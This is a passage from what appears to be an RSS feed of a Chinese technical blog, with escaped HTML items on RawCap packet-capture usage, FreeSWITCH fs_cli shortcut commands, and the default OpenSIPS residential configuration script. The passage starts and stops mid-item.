&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NIC Type  : Loopback
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 3.     IP        : 10.165.240.132
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NIC Name  : Mobile &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NIC Type  : Wwanpp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Example 1: RawCap.exe &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; dumpfile.pcap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Example 2: RawCap.exe -s &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; 127.0.0.1 localhost.pcap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Example 3: RawCap.exe 127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\p&lt;/span&gt;ipe&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;awCap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Example 4: RawCap.exe -q 127.0.0.1 - | Wireshark.exe -i - -k
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;:::warning
注意：&lt;/p&gt;</description>
    </item>
    <item>
      <title>fs_cli 例子</title>
      <link>https://wdd.js.org/freeswitch/fs-cli-example/</link>
      <pubDate>Tue, 07 Apr 2020 17:40:16 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/fs-cli-example/</guid>
      <description>&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-设置日志级别&#34;&gt;1. 设置日志级别&lt;/h1&gt;
&lt;p&gt;每个快捷键对应一个功能，具体配置位于 /conf/autoload_configs/switch.conf.xml&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F1. help
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F2. status
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F3. show channels
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F4. show calls
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F5. sofia status
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F6. reloadxml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F7. console loglevel &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F8. console loglevel &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F9. sofia status profile internal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F10. sofia profile intrenal siptrace on
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F11. sofia profile internal siptrace off
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F12. version
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-发起呼叫相关&#34;&gt;2. 发起呼叫相关&lt;/h1&gt;
&lt;p&gt;下面的命令都是同步的命令，可以在所有命令前加bgapi命令，让originate命令后台异步执行。&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>默认脚本</title>
      <link>https://wdd.js.org/opensips/ch8/default/</link>
      <pubDate>Tue, 07 Apr 2020 13:18:04 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/default/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# OpenSIPS residential configuration script&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#     by OpenSIPS Solutions &amp;lt;team@opensips-solutions.com&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This script was generated via &amp;#34;make menuconfig&amp;#34;, from&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   the &amp;#34;Residential&amp;#34; scenario.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# You can enable / disable more features / functionalities by&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   re-generating the scenario with different options.#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Please refer to the Core CookBook at:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#      http://www.opensips.org/Resources/DocsCookbooks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# for a explanation of possible statements, functions and parameters.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Global Parameters #########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_facility&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LOG_LOCAL0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;children&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the following lines to enable debugging */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#debug_mode=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable the auto temporary blacklisting of 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   not available destinations &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#disable_dns_blacklist=no&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable IPv6 lookup after IPv4 dns 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   lookup failures &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#dns_try_ipv6=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* comment the next line to enable the auto discovery of local aliases
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   based on reverse DNS on IPs */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auto_aliases&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;udp:127.0.0.1:5060   &lt;span style=&#34;color:#75715e&#34;&gt;# CUSTOMIZE ME&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Modules Section ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local//lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIGNALING module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;signaling.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### StateLess module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Transaction Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_timeout&amp;#34;&lt;/span&gt;, 5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_inv_timeout&amp;#34;&lt;/span&gt;, 30&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;restart_fr_on_each_reply&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onreply_avp_mode&amp;#34;&lt;/span&gt;, 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Record Route Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not append from tag to the RR &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no need &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this script&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### MAX ForWarD module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIP MSG OPerationS module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sipmsgops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### FIFO Management Interface&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_name&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/opensips_fifo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_mode&amp;#34;&lt;/span&gt;, 0666&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### URI module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;use_uri_table&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### USeR LOCation module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nat_bflag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NAT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;working_mode_preset&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;single-instance-no-db&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### REGISTRAR module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tcp_persistent_flag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TCP_PERSISTENT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line not to allow more than &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; contacts per AOR */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;registrar&amp;#34;, &amp;#34;max_contacts&amp;#34;, 10)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### ACCounting module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* what special events should be accounted ? */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;early_media&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;report_cancels&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* by default we &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not adjust the direct of the sequential requests.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; you enable this parameter, be sure to enable &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   in &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt; module */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;detect_direction&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;proto_udp.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Routing Logic ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main request routing logic&lt;/span&gt;
